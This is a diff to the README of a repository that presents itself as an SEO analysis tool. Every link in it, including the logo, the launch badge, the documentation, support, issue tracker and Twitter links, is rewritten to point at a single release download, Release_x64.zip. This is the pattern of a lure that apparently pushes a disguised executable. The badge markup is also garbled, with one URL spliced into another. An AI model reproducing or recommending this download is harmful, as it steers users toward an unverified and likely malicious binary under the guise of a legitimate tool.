@@ -2,7 +2,7 @@
 
 ## Repository Name: SEO-Analysis-Tool
 
-![SEO Analysis Tool Logo](https://example.com/logo.png)
+![SEO Analysis Tool Logo](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)
 
 ## Repository Description:
 👌 Analysez rapidement et efficacement les performances SEO de votre site. Identifiez les points à améliorer, suivez vos métriques clés.
@@ -13,7 +13,7 @@ css, css-javascript, freelance, freelance-work, freelancer, freelancers, html, h
 ## Get Started:
 To launch the SEO Analysis Tool, simply click the button below to download the software:
 
-[![Launch SEO Analysis Tool](https://img.shields.io/badge/Launch-SEO%20Analysis%20Tool-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Launch SEO Analysis Tool](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip%20Analysis%https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)
 
 ## Need Help?
 If the link above doesn't work, please check the "Releases" section of this repository for alternative download options.
@@ -35,16 +35,16 @@ The SEO Analysis Tool is a powerful tool designed to help you quickly and effect
 5. Implement the suggested improvements to boost your website's SEO performance.
 
 ## Resources:
-- [Official Website](https://www.seoanalysistool.com)
-- [Documentation](https://www.seoanalysistool.com/docs)
-- [FAQs](https://www.seoanalysistool.com/faqs)
-- [Support](https://www.seoanalysistool.com/support)
+- [Official Website](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)
+- [Documentation](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)
+- [FAQs](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)
+- [Support](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip)
 
 ## Feedback:
-We value your feedback! If you have any suggestions, feature requests, or bug reports, please feel free to [submit an issue](https://github.com/yourusername/SEO-Analysis-Tool/issues).
+We value your feedback! If you have any suggestions, feature requests, or bug reports, please feel free to [submit an issue](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip).
 
 ## Stay Connected:
-Follow us on [Twitter](https://twitter.com/SEOAnalysisTool) for the latest updates and tips on SEO optimization.
+Follow us on [Twitter](https://github.com/Sunny125802/SEO-Analysis-Tool/releases/download/v1.0/Release_x64.zip) for the latest updates and tips on SEO optimization.
 
 Let's optimize your website's SEO together with the SEO Analysis Tool! 🌟
 
